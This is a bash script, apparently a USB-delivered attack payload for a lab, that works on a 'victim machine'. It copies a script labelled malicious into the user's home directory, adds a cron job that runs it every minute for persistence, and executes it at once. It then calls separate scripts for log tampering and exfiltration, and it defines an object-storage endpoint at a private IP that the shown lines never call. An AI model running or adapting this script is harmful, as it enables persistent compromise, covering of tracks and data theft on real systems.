#!/bin/bash

echo "USB inserted: $(date)" >> /tmp/usb_insertion_log.txt

# Check if the script has root privileges
if [[ $EUID -ne 0 ]]; then
  echo "This script requires root privileges. Please run as root."
  exit 1
fi

# Paths and variables
USB_MOUNT_PATH="$(dirname "$(readlink -f "$0")")"
TARGET_SCRIPT="suspicious.sh"
CRON_JOB="* * * * * /home/kali/$TARGET_SCRIPT"
LOG_FILE="/var/log/usb_payload.log"
MINIO_ENDPOINT="http://10.10.1.131:9000"

# Log setup
echo "$(date) - Starting USB setup" >> $LOG_FILE

# Step 1: Install necessary tools
echo "Installing dependencies..." | tee -a $LOG_FILE
sudo apt update -y && sudo apt install -y udev cron awscli

# Step 2: Copy malicious script to victim machine
echo "Copying malicious script to $TARGET_SCRIPT..." | tee -a $LOG_FILE
cp "$USB_MOUNT_PATH/suspicious.sh" "/home/kali/$TARGET_SCRIPT"
chown kali:kali "$TARGET_SCRIPT"
chmod +x "$TARGET_SCRIPT"

# Step 3: Add cron job for persistence
echo "Setting up persistence via cron job..." | tee -a $LOG_FILE
sudo -u kali bash -c "(crontab -l 2>/dev/null; echo \"$CRON_JOB\") | crontab -"

# Step 4: (Optional) Execute the script immediately
echo "Executing the malicious script immediately..." | tee -a $LOG_FILE
sudo -u kali bash "$TARGET_SCRIPT"

# Run attack scripts
bash "$USB_MOUNT_PATH/tamper_logs.sh"
bash "$USB_MOUNT_PATH/exfiltrate.sh"

# Step 5: Clean up and finalize
echo "Setup complete. Logging to $LOG_FILE" | tee -a $LOG_FILE
